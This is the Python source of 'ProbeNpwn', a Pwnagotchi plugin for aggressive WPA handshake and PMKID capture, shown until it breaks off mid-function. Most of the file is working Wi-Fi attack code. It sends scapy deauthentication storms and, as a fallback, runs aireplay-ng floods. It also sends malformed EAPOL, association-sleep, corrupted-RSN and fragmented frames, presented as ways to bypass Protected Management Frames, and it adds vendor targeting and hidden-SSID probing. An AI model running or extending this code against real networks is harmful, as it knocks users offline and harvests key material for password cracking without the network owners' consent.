"""
ProbeNpwn v2.0.0 – Ultra‑aggressive handshake/PMKID capture
Author: AlienMajik (enhanced by Rex)
License: GPL3

Features:
- Adaptive modes: tactical, maniac, stealth
- UCB1 channel hopping with channel activity bonus
- Vendor targeting & client scoring
- Multi‑band (2.4/5/6 GHz) support
- PMF bypass: malformed EAPOL, association sleep, RSN IE corruption, fragmentation
- Persistent blacklist with expiry (saved on every change)
- Retry queue with bounded size & priority
- Per‑AP rate limiting (token bucket)
- Asynchronous packet injection (scapy or external tools fallback)
- JSON logging with GPS and log rotation
- Enhanced UI: mode, top channels, PMF status, success bar
- **Individual UI element toggles** – enable/disable each component separately
- All data structures bounded by time or size
- Defensive programming & comprehensive error handling
"""

import logging
import time
import threading
import os
import subprocess
import random
import json
import math
import struct
from collections import OrderedDict, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, TimeoutError
from queue import PriorityQueue, Empty
import heapq
import bisect
import multiprocessing

# Optional imports
try:
    import psutil
except ImportError:
    psutil = None

import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components

# Scapy for PMF bypass and advanced packet injection
try:
    from scapy.all import RadioTap, Dot11, Dot11QoS, LLC, SNAP, EAPOL, sendp, Raw, Dot11Deauth, Dot11ProbeReq
    from scapy.all import Dot11AssoReq, Dot11Elt, Dot11EltRSN, fragment
    from scapy.all import conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ----------------------------------------------------------------------
# Constants (magic numbers replaced with named constants)
# ----------------------------------------------------------------------
DEFAULT_BLACKLIST_PATH = "/root/handshakes/probenpwn_blacklist.json"
DEFAULT_LOG_PATH = "/root/handshakes/probenpwn_captures.jsonl"
LOG_MAX_BYTES = 10 * 1024 * 1024  # 10 MB
LOG_BACKUP_COUNT = 3

MAX_RECENTS = 1000
MAX_SCORES = 2000
MAX_AP_CLIENTS = 1000
MAX_AP_GROUPS = 1000
MAX_CLIENTS_PER_AP = 100
MAX_HANDSHAKE_DB = 5000
MAX_DELAY_CACHE = 500
MAX_ATTEMPT_HISTORY = 2000
MAX_RETRY_QUEUE = 300
GPS_HISTORY_MAX_AGE = 300

RECENT_TTL = 60              # seconds
SCORE_DECAY_FACTOR = 0.99    # per epoch
CHANNEL_SUCCESS_DECAY = 0.995
ATTEMPT_DECAY_FACTOR = 0.98  # per epoch

# Rate limiting (token bucket) – default values, can be overridden in config
RATE_LIMIT_TOKENS_PER_AP = 5      # initial tokens
RATE_LIMIT_REFILL_RATE = 0.5      # tokens per second
RATE_LIMIT_MAX_TOKENS = 10

# ----------------------------------------------------------------------
# Helper: TTL cache using OrderedDict (no external deps)
# ----------------------------------------------------------------------
class TTLCache:
    """Simple TTL cache with max size, using OrderedDict."""
    def __init__(self, maxsize, ttl):
        self.maxsize = maxsize
        self.ttl = ttl
        self.cache = OrderedDict()
        self.timestamps = OrderedDict()
        self.lock = threading.Lock()

    def __contains__(self, key):
        with self.lock:
            return key in self.cache and (time.time() - self.timestamps[key] < self.ttl)

    def get(self, key, default=None):
        with self.lock:
            if key in self.cache and (time.time() - self.timestamps[key] < self.ttl):
                # move to end (LRU)
                self.cache.move_to_end(key)
                self.timestamps.move_to_end(key)
                return self.cache[key]
            return default

    def put(self, key, value):
        with self.lock:
            now = time.time()
            # if exists, update and move to end
            if key in self.cache:
                self.cache[key] = value
                self.timestamps[key] = now
                self.cache.move_to_end(key)
                self.timestamps.move_to_end(key)
            else:
                # enforce max size
                if len(self.cache) >= self.maxsize:
                    # pop oldest (first item)
                    self.cache.popitem(last=False)
                    self.timestamps.popitem(last=False)
                self.cache[key] = value
                self.timestamps[key] = now

    def remove(self, key):
        with self.lock:
            if key in self.cache:
                del self.cache[key]
                del self.timestamps[key]

    def cleanup(self):
        """Remove expired entries."""
        with self.lock:
            now = time.time()
            expired = [k for k, t in self.timestamps.items() if now - t >= self.ttl]
            for k in expired:
                del self.cache[k]
                del self.timestamps[k]

    def items(self):
        with self.lock:
            return list(self.cache.items())

# ----------------------------------------------------------------------
# Rate limiter (token bucket) per AP
# ----------------------------------------------------------------------
class TokenBucket:
    def __init__(self, rate, capacity, initial=None):
        self.rate = rate
        self.capacity = capacity
        self.tokens = initial if initial is not None else capacity
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def consume(self, tokens=1):
        with self.lock:
            self._refill()
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
        self.last_refill = now

# ----------------------------------------------------------------------
# Main Plugin Class
# ----------------------------------------------------------------------
class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '2.0.0'
    __license__ = 'GPL3'
    __description__ = 'Ultra‑aggressive handshake/PMKID capture v2.0 – adaptive modes, UCB1, vendor targeting, PMF bypass, stealth, rate limiting, external tool fallback, per‑UI toggles.'

    def __init__(self):
        super().__init__()
        logging.debug("ProbeNpwn v2.0.0 initializing")

        # -------------------- Configuration (will be overridden) --------------------
        self.config = {}
        self.agent = None

        # -------------------- UI Toggles (default True) --------------------
        self.show_attacks = True
        self.show_success = True
        self.show_handshakes = True
        self.show_mode = True
        self.show_top_channels = True
        self.show_pmf_status = True
        self.show_success_bar = True
        self.show_pnp_status = True

        # -------------------- Data structures (bounded) --------------------
        self.recents = TTLCache(MAX_RECENTS, RECENT_TTL)   # AP/client info by MAC
        self.handshake_db = set()                           # (ap_mac, cl_mac) – bounded in on_epoch
        self.delay_cache = TTLCache(MAX_DELAY_CACHE, 60)    # (ap,cl) -> delay

        # Per‑AP statistics (will be pruned periodically)
        self.attack_attempts = defaultdict(int)      # ap_mac -> count
        self.success_counts = defaultdict(int)
        self.assoc_fails = defaultdict(int)
        self.last_success_time = defaultdict(float)

        # Client scoring
        self.client_scores = OrderedDict()            # cl_mac -> score, bounded
        # AP client groups
        self.ap_client_groups = OrderedDict()         # ap_mac -> list of cl_mac, bounded
        # Channel stats
        self.channel_visits = defaultdict(int)
        self.total_channel_visits = 0
        self.channel_success = defaultdict(float)     # decayed success count
        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0})

        # Whitelist/blacklist
        self.whitelist = set()
        self.blacklist = TTLCache(MAX_AP_GROUPS, 3600)   # ap_mac -> expiry (as value), but we store expiry in value

        # Cooldowns (tactical mode)
        self.cooldowns = TTLCache(MAX_AP_GROUPS, 3600)

        # Retry queue: priority queue (timestamp, retry_count, args)
        self.retry_queue = []
        self.retry_queue_lock = threading.Lock()

        # Rate limiters per AP
        self.rate_limiters = {}          # ap_mac -> TokenBucket
        self.rate_limiter_lock = threading.Lock()

        # -------------------- Threading --------------------
        self.executor = None              # created in on_loaded with agent
        self.executor_lock = threading.Lock()
        self._watchdog_thread = None
        self._watchdog_running = True

        # -------------------- Mode & Scaling --------------------
        self.mode = "tactical"            # tactical, maniac, stealth
        self.effective_mode = "tactical"
        self.mobility_score = 0.0
        self.new_aps_per_epoch = 0
        self.epoch_count = 0
        self.env_check_interval = 10

        # Scaling parameters (min, max) – will be set from config
        self.scaling_bounds = {
            'recon_time': (2, 30),
            'ap_ttl': (30, 300),
            'sta_ttl': (30, 300),
            'deauth_prob': (0.9, 1.0),
            'assoc_prob': (0.9, 1.0),
            'min_rssi': (-85, -60),
            'throttle_a': (0.1, 0.2),
            'throttle_d': (0.1, 0.2),
        }

        # -------------------- Channels --------------------
        self.enable_5ghz = False
        self.enable_6ghz = False
        self.possible_channels = list(range(1, 14))
        self.five_ghz_channels = [36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165]
        self.six_ghz_channels = list(range(1, 234, 4))

        # -------------------- PMF Bypass Methods --------------------
        self.pmf_bypass_methods = []       # list of strings, e.g., ['bad_msg', 'assoc_sleep', 'rsn_corrupt', 'frag']
        self.scapy_available = SCAPY_AVAILABLE
        self.monitor_iface = "wlan0mon"

        # -------------------- External Tools --------------------
        self.use_external_tools = False    # fallback if scapy missing
        self.external_tools = {
            'aireplay': self._check_tool('aireplay-ng'),
            'mdk4': self._check_tool('mdk4'),
            'hcxdumptool': self._check_tool('hcxdumptool'),
        }

        # -------------------- UI --------------------
        self.ui_initialized = False
        self.last_ui_update = 0
        self.ui_update_interval = 5
        # positions will be set from config
        self.ui_positions = {
            'attacks': (10, 20),
            'success': (10, 30),
            'handshakes': (10, 40),
            'pnp_status': (10, 90),
            'mode': (10, 50),
            'top_channels': (10, 60),
            'pmf_status': (10, 70),
            'success_bar': (10, 80),
        }

        # -------------------- GPS History --------------------
        self.gps_history = deque(maxlen=10)

        # -------------------- Logging --------------------
        self.log_path = DEFAULT_LOG_PATH
        self.log_max_bytes = LOG_MAX_BYTES
        self.log_backup_count = LOG_BACKUP_COUNT

    # ------------------------------------------------------------------
    # Helper: check if external tool exists
    # ------------------------------------------------------------------
    def _check_tool(self, name):
        try:
            subprocess.run([name, '--version'], capture_output=True, timeout=5)
            return True
        except:
            return False

    # ------------------------------------------------------------------
    # on_loaded – called when plugin is loaded
    # ------------------------------------------------------------------
    def on_loaded(self):
        logging.info("ProbeNpwn v2.0.0 loaded")
        # Create directories for blacklist/log
        os.makedirs(os.path.dirname(DEFAULT_BLACKLIST_PATH), exist_ok=True)
        os.makedirs(os.path.dirname(DEFAULT_LOG_PATH), exist_ok=True)

        # Load persistent blacklist
        self._load_blacklist()

        # Attempt scapy install if missing
        if not self.scapy_available:
            self._attempt_scapy_install()

        # Start watchdog thread (agent will be set later in on_ready)
        self._watchdog_running = True
        self._watchdog_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._watchdog_thread.start()

    def _load_blacklist(self):
        """Load blacklist from JSON file, removing expired entries."""
        blacklist_path = self.config.get('blacklist_path', DEFAULT_BLACKLIST_PATH)
        if os.path.exists(blacklist_path):
            try:
                with open(blacklist_path, 'r') as f:
                    data = json.load(f)
                    now = time.time()
                    for mac, expiry in data.items():
                        if expiry > now:
                            self.blacklist.put(mac, expiry)
                logging.info(f"Loaded {len(self.blacklist.cache)} active blacklist entries")
            except Exception as e:
                logging.warning(f"Blacklist load failed: {e}")

    def _save_blacklist(self):
        """Save blacklist to JSON file (only non‑expired entries)."""
        blacklist_path = self.config.get('blacklist_path', DEFAULT_BLACKLIST_PATH)
        try:
            now = time.time()
            data = {mac: expiry for mac, expiry in self.blacklist.items() if expiry > now}
            with open(blacklist_path, 'w') as f:
                json.dump(data, f)
        except Exception as e:
            logging.warning(f"Blacklist save failed: {e}")

    def _attempt_scapy_install(self):
        """Try to install scapy via apt or pip."""
        logging.warning("Scapy missing – attempting install...")
        # Check for apt (Debian-based)
        try:
            subprocess.run(["which", "apt"], check=True, capture_output=True)
            subprocess.run(["sudo", "apt", "update"], timeout=60, check=False)
            res = subprocess.run(["sudo", "apt", "install", "-y", "python3-scapy"], timeout=300, capture_output=True)
            if res.returncode == 0:
                logging.info("Scapy installed via apt")
            else:
                # fallback to pip
                res = subprocess.run(["pip3", "install", "--user", "scapy"], timeout=180, capture_output=True)
                if res.returncode == 0:
                    logging.info("Scapy installed via pip")
                else:
                    logging.error("Scapy install failed")
                    return
            # Test import
            test_code = "from scapy.all import RadioTap; print('ok')"
            res = subprocess.run(["python3", "-c", test_code], capture_output=True, timeout=10)
            if b'ok' in res.stdout:
                self.scapy_available = True
                logging.info("Scapy now available after install")
            else:
                logging.error("Scapy import test failed")
        except Exception as e:
            logging.error(f"Scapy install error: {e}")

    # ------------------------------------------------------------------
    # on_config_changed – called with full pwnagotchi config
    # ------------------------------------------------------------------
    def on_config_changed(self, config):
        self.whitelist = {m.lower() for m in config["main"].get("whitelist", [])}
        cfg = config["main"]["plugins"].get("probenpwn", {})

        self.verbose = cfg.get("verbose", False)
        logging.getLogger().setLevel(logging.DEBUG if self.verbose else logging.INFO)

        self.mode = cfg.get("mode", "tactical").lower()
        self.effective_mode = "tactical" if self.mode == "adaptive" else self.mode

        # UI toggles – default to True if not specified
        self.show_attacks = cfg.get("show_attacks", True)
        self.show_success = cfg.get("show_success", True)
        self.show_handshakes = cfg.get("show_handshakes", True)
        self.show_mode = cfg.get("show_mode", True)
        self.show_top_channels = cfg.get("show_top_channels", True)
        self.show_pmf_status = cfg.get("show_pmf_status", True)
        self.show_success_bar = cfg.get("show_success_bar", True)
        self.show_pnp_status = cfg.get("show_pnp_status", True)

        # UI coordinates (override defaults)
        for key in self.ui_positions:
            x = cfg.get(f"{key}_x_coord", self.ui_positions[key][0])
            y = cfg.get(f"{key}_y_coord", self.ui_positions[key][1])
            self.ui_positions[key] = (x, y)

        self.enable_5ghz = cfg.get("enable_5ghz", False)
        self.enable_6ghz = cfg.get("enable_6ghz", False)
        self.max_retries = cfg.get("max_retries", 3)
        self.env_check_interval = cfg.get("env_check_interval", 10)
        self.target_vendors = {v.lower() for v in cfg.get("target_vendors", [])}

        # PMF bypass methods
        methods = cfg.get("pmf_bypass_methods", [])
        if isinstance(methods, str):
            methods = [m.strip() for m in methods.split(',')]
        self.pmf_bypass_methods = [m for m in methods if m in ['bad_msg', 'assoc_sleep', 'rsn_corrupt', 'frag']]

        # External tools fallback
        self.use_external_tools = cfg.get("use_external_tools", False)

        # Scaling bounds
        for k, (lo, hi) in self.scaling_bounds.items():
            self.scaling_bounds[k] = (
                cfg.get(f"min_{k}", lo),
                cfg.get(f"max_{k}", hi)
            )

        # Channels list
        self.possible_channels = list(range(1, 14))
        if self.enable_5ghz:
            self.possible_channels += self.five_ghz_channels
        if self.enable_6ghz:
            self.possible_channels += self.six_ghz_channels
        self.possible_channels = list(set(self.possible_channels))

        # Log path
        self.log_path = cfg.get("log_path", DEFAULT_LOG_PATH)
        self.log_max_bytes = cfg.get("log_max_bytes", LOG_MAX_BYTES)
        self.log_backup_count = cfg.get("log_backup_count", LOG_BACKUP_COUNT)

        # Blacklist path
        blacklist_path = cfg.get("blacklist_path", DEFAULT_BLACKLIST_PATH)
        if blacklist_path != DEFAULT_BLACKLIST_PATH:
            self.config['blacklist_path'] = blacklist_path

        # Rate limiting
        self.rate_limit_refill_rate = cfg.get("rate_limit_refill_rate", RATE_LIMIT_REFILL_RATE)
        self.rate_limit_max_tokens = cfg.get("rate_limit_max_tokens", RATE_LIMIT_MAX_TOKENS)

    # ------------------------------------------------------------------
    # on_ready – called when pwnagotchi is ready (agent available)
    # ------------------------------------------------------------------
    def on_ready(self, agent):
        self.agent = agent
        # Create thread pool executor with size based on CPU count (fixed, no resizing)
        cpu_count = multiprocessing.cpu_count()
        # Conservative size: 2 * cpu_count (but at least 5, max 20)
        workers = max(5, min(20, cpu_count * 2))
        self.executor = ThreadPoolExecutor(max_workers=workers)
        logging.info(f"ThreadPoolExecutor started with {workers} workers")

        # Clear wifi (start fresh)
        agent.run("wifi.clear")
        status = "Maniac engaged!" if self.effective_mode == "maniac" else \
                 "Stealth mode..." if self.effective_mode == "stealth" else "Tactical probe..."
        if not self.scapy_available and not self.use_external_tools:
            status = "PMF off (no Scapy/tools)"
        agent._view.set('pnp_status', status)

    # ------------------------------------------------------------------
    # on_unload – cleanup
    # ------------------------------------------------------------------
    def on_unload(self, ui):
        self._watchdog_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join(timeout=5.0)
        self._save_blacklist()
        if self.executor:
            self.executor.shutdown(wait=False)
        logging.info("ProbeNpwn unloaded")

    # ------------------------------------------------------------------
    # UI setup – add custom elements (only if enabled)
    # ------------------------------------------------------------------
    def on_ui_setup(self, ui):
        if self.ui_initialized:
            return
        if self.show_attacks:
            ui.add_element('attacks', components.Text(position=self.ui_positions['attacks'], value='Attacks: 0', color=255))
        if self.show_success:
            ui.add_element('success', components.Text(position=self.ui_positions['success'], value='Success: 0.0%', color=255))
        if self.show_handshakes:
            ui.add_element('handshakes', components.Text(position=self.ui_positions['handshakes'], value='Handshakes: 0', color=255))
        if self.show_mode:
            ui.add_element('mode', components.Text(position=self.ui_positions['mode'], value='Mode: tactical', color=255))
        if self.show_top_channels:
            ui.add_element('top_channels', components.Text(position=self.ui_positions['top_channels'], value='Ch: 1,6,11', color=255))
        if self.show_pmf_status:
            ui.add_element('pmf_status', components.Text(position=self.ui_positions['pmf_status'], value='PMF: off', color=255))
        if self.show_success_bar:
            ui.add_element('success_bar', components.Text(position=self.ui_positions['success_bar'], value='[____]', color=255))
        if self.show_pnp_status:
            ui.add_element('pnp_status', components.Text(position=self.ui_positions['pnp_status'], value='Probe ready', color=255))
        self.ui_initialized = True

    # ------------------------------------------------------------------
    # UI update (throttled) – only update enabled elements
    # ------------------------------------------------------------------
    def on_ui_update(self, ui):
        if time.time() - self.last_ui_update < self.ui_update_interval:
            return
        total_attempts = sum(self.attack_attempts.values())
        total_success = sum(self.success_counts.values())
        success_rate = (total_success / total_attempts * 100) if total_attempts else 0.0

        if self.show_attacks:
            ui.set('attacks', f"Attacks: {total_attempts}")
        if self.show_success:
            ui.set('success', f"Success: {success_rate:.1f}%")
        if self.show_handshakes:
            ui.set('handshakes', f"Handshakes: {len(self.handshake_db)}")
        if self.show_mode:
            ui.set('mode', f"Mode: {self.effective_mode}")
        if self.show_pmf_status:
            ui.set('pmf_status', f"PMF: {'on' if self.pmf_bypass_methods else 'off'}")
        if self.show_top_channels:
            top_ch = self._get_top_channels(3)
            ui.set('top_channels', f"Ch: {','.join(str(ch) for ch in top_ch)}")
        if self.show_success_bar:
            bar_len = 20
            filled = int(success_rate / 100 * bar_len)
            bar = '[' + '#'*filled + '_'*(bar_len-filled) + ']'
            ui.set('success_bar', bar)
        # pnp_status is updated only in on_ready and when mode changes, not every cycle

        self.last_ui_update = time.time()

    def _get_top_channels(self, n):
        """Return top n channels by current UCB score."""
        scores = []
        for ch in self.possible_channels:
            visits = self.channel_visits.get(ch, 0)
            if visits == 0:
                scores.append((float('inf'), ch))
            else:
                reward = self.channel_success[ch] / visits
                explore = math.sqrt(2 * math.log(max(1, self.total_channel_visits)) / visits)
                bonus = (self.channel_activity[ch]["aps"] + self.channel_activity[ch]["clients"]) / 10
                scores.append((reward + explore + bonus, ch))
        scores.sort(reverse=True)
        return [ch for _, ch in scores[:n]]

    # ------------------------------------------------------------------
    # Watchdog thread: channel hopping & interface check
    # ------------------------------------------------------------------
    def _watchdog(self):
        while self._watchdog_running:
            try:
                if self.agent is None:
                    time.sleep(1)
                    continue
                # Check monitor interface
                if not os.path.exists(f"/sys/class/net/{self.monitor_iface}"):
                    logging.error(f"{self.monitor_iface} missing – attempting recovery")
                    try:
                        subprocess.run(["monstop"], check=False, timeout=10)
                        subprocess.run(["monstart"], check=False, timeout=10)
                    except Exception as e:
                        logging.error(f"Interface recovery failed: {e}")

                channel = self.select_channel()
                # Validate channel
                if channel not in self.possible_channels or channel < 1:
                    logging.warning(f"Invalid channel {channel} selected, falling back to random")
                    channel = random.choice(self.possible_channels) if self.possible_channels else 1
                self.agent.set_channel(channel)
                self.channel_visits[channel] += 1
                self.total_channel_visits += 1

                # No dynamic executor resizing – using fixed size.
                time.sleep(10)
            except Exception as e:
                logging.exception("Error in watchdog thread")

    # ------------------------------------------------------------------
    # Channel selection using UCB1 with activity bonus
    # ------------------------------------------------------------------
    def select_channel(self):
        if not self.channel_visits:
            return random.choice(self.possible_channels)

        log_total = math.log(max(1, self.total_channel_visits))
        ucb = {}
        for ch in self.possible_channels:
            visits = self.channel_visits.get(ch, 0)
            if visits == 0:
                ucb[ch] = float('inf')
                continue
            reward = self.channel_success[ch] / visits
            explore = math.sqrt(2 * log_total / visits)
            bonus = (self.channel_activity[ch]["aps"] + self.channel_activity[ch]["clients"]) / 10
            ucb[ch] = reward + explore + bonus

        # Return channel with max UCB
        return max(ucb, key=ucb.get)

    # ------------------------------------------------------------------
    # Tracking recent APs/clients (TTL cache)
    # ------------------------------------------------------------------
    def track_recent(self, ap, cl=None):
        now = time.time()
        ap_mac = ap['mac'].lower()
        ap['_track_time'] = now
        self.recents.put(ap_mac, ap)
        if cl:
            cl_mac = cl['mac'].lower()
            cl['_track_time'] = now
            self.recents.put(cl_mac, cl)

    # ------------------------------------------------------------------
    # Attack eligibility checks
    # ------------------------------------------------------------------
    def ok_to_attack(self, agent, ap):
        mac = ap['mac'].lower()
        if mac in self.whitelist or ap.get('hostname', '').lower() in self.whitelist:
            return False
        # RSSI check
        min_rssi = self.get_scaled_param('min_rssi')
        if ap.get('rssi', -100) < min_rssi:
            return False
        # Blacklist check
        expiry = self.blacklist.get(mac)
        if expiry and time.time() < expiry:
            return False
        # Cooldown check (tactical mode)
        if self.effective_mode == "tactical":
            cooldown = self.cooldowns.get(mac)
            if cooldown and time.time() < cooldown:
                return False
        return True

    # ------------------------------------------------------------------
    # Scaled parameter based on mobility score
    # ------------------------------------------------------------------
    def get_scaled_param(self, name):
        lo, hi = self.scaling_bounds.get(name, (0, 1))
        s = self.mobility_score
        if name in ['throttle_a', 'throttle_d']:
            # these decrease with mobility
            return hi - s * (hi - lo)
        else:
            # these increase with mobility
            return lo + s * (hi - lo)

    # ------------------------------------------------------------------
    # Mobility score calculation (GPS + new APs)
    # ------------------------------------------------------------------
    def calculate_mobility_score(self, agent):
        gps = agent.session().get('gps', {})
        now = time.time()
        if 'Latitude' not in gps or gps['Latitude'] == 0:
            # No GPS, use AP churn
            return min(1.0, self.new_aps_per_epoch / 20.0)

        cur = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
        self.gps_history.append((now, cur))

        speeds = []
        for i in range(1, len(self.gps_history)):
            t_prev, g_prev = self.gps_history[i-1]
            t_cur, g_cur = self.gps_history[i]
            dt = max(2.0, t_cur - t_prev)  # clamp to avoid division by zero
            lat1 = math.radians(g_prev['Latitude'])
            lon1 = math.radians(g_prev['Longitude'])
            lat2 = math.radians(g_cur['Latitude'])
            lon2 = math.radians(g_cur['Longitude'])
            d = 6371 * 2 * math.asin(math.sqrt(
                math.sin((lat2-lat1)/2)**2 + math.cos(lat1)*math.cos(lat2)*math.sin((lon2-lon1)/2)**2
            ))
            speed = min(300.0, (d / dt) * 3600)  # km/h capped
            speeds.append(speed)

        speed_norm = sorted(speeds)[len(speeds)//2] / 50.0 if speeds else 0.0
        ap_norm = min(1.0, self.new_aps_per_epoch / 20.0)
        return min(1.0, max(speed_norm, ap_norm))

    # ------------------------------------------------------------------
    # Dynamic attack delay (with per‑AP rate limiting)
    # ------------------------------------------------------------------
    def dynamic_attack_delay(self, ap, cl):
        # Use cached delay if recent
        key = (ap['mac'].lower(), cl['mac'].lower() if cl else '')
        cached = self.delay_cache.get(key)
        if cached is not None:
            return cached

        rssi = max(ap.get('rssi', -100), cl.get('rssi', -100) if cl else -100)

        if self.effective_mode == "maniac":
            delay = 0.05
        elif self.effective_mode == "stealth":
            delay = 0.5  # slower
        else:  # tactical
            base = 0.1 if rssi >= -60 else 0.2
            attempts = self.attack_attempts[ap['mac'].lower()]
            if attempts > 5:
                base *= 0.4
            # more clients -> slightly lower delay
            num_clients = len(self.ap_client_groups.get(ap['mac'].lower(), []))
            if num_clients > 3:
                base *= 0.8
            delay = base * (0.95 + random.random() * 0.1)

        self.delay_cache.put(key, delay)
        return delay

    # ------------------------------------------------------------------
    # Rate limiter for a given AP (token bucket)
    # ------------------------------------------------------------------
    def _rate_limit_ap(self, ap_mac):
        with self.rate_limiter_lock:
            if ap_mac not in self.rate_limiters:
                # Create new bucket with configurable rate/capacity
                rate = self.rate_limit_refill_rate
                capacity = self.rate_limit_max_tokens
                self.rate_limiters[ap_mac] = TokenBucket(rate, capacity)
            bucket = self.rate_limiters[ap_mac]
        return bucket.consume()

    # ------------------------------------------------------------------
    # PMF detection
    # ------------------------------------------------------------------
    def is_pmf_protected(self, ap):
        return ap.get('mfpr', False) or ap.get('pmf', False)

    # ------------------------------------------------------------------
    # PMF bypass attacks (using scapy)
    # ------------------------------------------------------------------
    def assoc_sleep_attack(self, ap_mac, client_macs):
        """Send association‑sleep frames to trigger handshake."""
        if not self.scapy_available:
            return
        for cl_mac in client_macs[:8]:
            pkt = (
                RadioTap()
                / Dot11(addr1=ap_mac, addr2=cl_mac, addr3=ap_mac, FCfield="to-DS+pwrmgt")
                / Dot11QoS()
                / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
                / SNAP()
            )
            try:
                # Use sendp with count and inter to avoid blocking
                sendp(pkt, iface=self.monitor_iface, count=8, inter=0.1, verbose=0)
            except Exception as e:
                logging.debug(f"assoc_sleep_attack failed: {e}")

    def bad_msg_attack(self, ap_mac, client_macs):
        """Send malformed EAPOL frames to provoke response."""
        if not self.scapy_available:
            return
        for cl_mac in client_macs[:6]:
            replay = struct.pack(">Q", random.randint(1, 0xFFFFFFFFFFFFFFFF))
            payload = (
                b'\x02' +                        # Key Type: Pairwise
                struct.pack(">H", 0x008a) +      # Key Info
                replay +
                b'\x00\x10' +                    # Key Length
                b'\x00' * 16 +                   # fake MIC area
                b'\x01' * 77                      # garbage padding
            )
            pkt = (
                RadioTap()
                / Dot11(addr1=cl_mac, addr2=ap_mac, addr3=ap_mac, FCfield="to-DS")
                / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
                / SNAP()
                / EAPOL(version=2, type=3, len=len(payload))
                / Raw(load=payload)
            )
            try:
                sendp(pkt, iface=self.monitor_iface, count=5, inter=0.08, verbose=0)
            except Exception as e:
                logging.debug(f"bad_msg_attack failed: {e}")

    def rsn_corrupt_attack(self, ap_mac, client_macs):
        """
        Send association request with a corrupted RSN IE.
        This attempts to trigger a response from the AP that may include handshake material.
        We'll send an association request with a malformed RSN element (e.g., invalid version,
        invalid cipher suite, or truncated element) to potentially cause the AP to reply
        with an EAPOL message.
        """
        if not self.scapy_available or not client_macs:
            return
        # For each client, send a crafted association request from that client to the AP
        for cl_mac in client_macs[:4]:
            # Build a corrupted RSN IE:
            # - Element ID 48 (RSN)
            # - Length field set to something wrong (e.g., 2, but real RSN is longer)
            # - Or we can construct a Dot11EltRSN and then corrupt its fields.
            # Simpler: create a Dot11Elt with ID 48 and a malformed body.
            # Standard RSN IE: 48, len, version(2), group cipher(4), pairwise count(2), etc.
            # We'll make a very short IE (len=2) which is invalid.
            rsn_ie = Dot11Elt(ID=48, len=2, info=b'\x01\x00')  # invalid length
            pkt = (
                RadioTap()
                / Dot11(addr1=ap_mac, addr2=cl_mac, addr3=ap_mac)
                / Dot11AssoReq(listen_interval=0)
                / rsn_ie
            )
            try:
                sendp(pkt, iface=self.monitor_iface, count=3, inter=0.1, verbose=0)
            except Exception as e:
                logging.debug(f"rsn_corrupt_attack failed: {e}")

    def frag_attack(self, ap_mac, client_macs):
        """
        Fragmentation attack: split an EAPOL frame into multiple fragments.
        This can sometimes bypass certain checks or cause the AP to reassemble and respond.
        We'll construct a valid EAPOL frame and fragment it.
        """
        if not self.scapy_available or not client_macs:
            return
        # Build a minimal EAPOL frame (e.g., EAPOL-Key with bogus data)
        replay = struct.pack(">Q", random.randint(1, 0xFFFFFFFFFFFFFFFF))
        payload = (
            b'\x02' +                        # Key Type: Pairwise
            struct.pack(">H", 0x008a) +      # Key Info
            replay +
            b'\x00\x10' +                    # Key Length
            b'\x00' * 16                      # MIC (all zeros)
        )
        eapol = EAPOL(version=2, type=3, len=len(payload)) / Raw(load=payload)
        # Build the full packet (including Dot11, LLC, SNAP)
        base_pkt = (
            RadioTap()
            / Dot11(addr1=ap_mac, addr2=client_macs[0], addr3=ap_mac, FCfield="to-DS")
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
            / SNAP()
            / eapol
        )
        # Fragment the packet (e.g., into 2 fragments)
        frags = fragment(base_pkt, fragsize=50)  # break into ~50-byte fragments
        for f in frags:
            try:
                sendp(f, iface=self.monitor_iface, count=1, inter=0.05, verbose=0)
            except Exception as e:
                logging.debug(f"frag_attack send failed: {e}")

    # ------------------------------------------------------------------
    # Deauth storm (only in maniac mode, and only for high‑value clients)
    # ------------------------------------------------------------------
    def deauth_storm(self, ap, client_macs):
        if self.effective_mode != "maniac":
            return
        for cl_mac in client_macs[:4]:
            score = self.client_scores.get(cl_mac.lower(), 0)
            if score <= 300:
                continue
            logging.debug(f"Deauth storm on high-value {cl_mac} ({score})")
            if self.scapy_available:
                # Use scapy with count/inter
                pkt = RadioTap() / Dot11Deauth(addr1=cl_mac, addr2=ap['mac'], addr3=ap['mac'], reason=7)
                try:
                    sendp(pkt, iface=self.monitor_iface, count=20, inter=0.02, verbose=0)
                except Exception as e:
                    logging.debug(f"Deauth storm scapy failed: {e}")
            elif self.use_external_tools and self.external_tools.get('aireplay'):
                # Fallback to aireplay-ng
                cmd = ["aireplay-ng", "-0", "20", "-a", ap['mac'], "-c", cl_mac, self.monitor_iface]
                try:
                    subprocess.run(cmd, timeout=5, capture_output=True)
                except Exception as e:
                    logging.debug(f"aireplay deauth failed: {e}")

    # ------------------------------------------------------------------
    # Hidden SSID probing
    # ------------------------------------------------------------------
    def probe_hidden_ssid(self, ap, client_macs):
        """If AP has hidden SSID (empty hostname), send directed probe requests."""
        if ap.get('hostname') and ap['hostname'] != '':
            return  # not hidden
        if not self.scapy_available:
            return
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(addr1=ap['mac'], addr2=cl_mac, addr3=ap['mac']) / Dot11ProbeReq()
            try:
                sendp(pkt, iface=self.monitor_iface, count=3, inter=0.1, verbose=0)
            except Exception as e:
                logging.debug(f"Hidden SSID probe failed: {e}")

    # ------------------------------------------------------------------
    # Main attack function (submitted to executor)
    # ------------------------------------------------------------------
    def attack_target(self, agent, ap, cl=None, retry=0):
        if retry > self.max_retries:
            return
        ap_mac = ap['mac'].lower()
        # Rate limit check
        if not self._rate_limit_ap(ap_mac):
            # If rate limited, push to retry queue with backoff
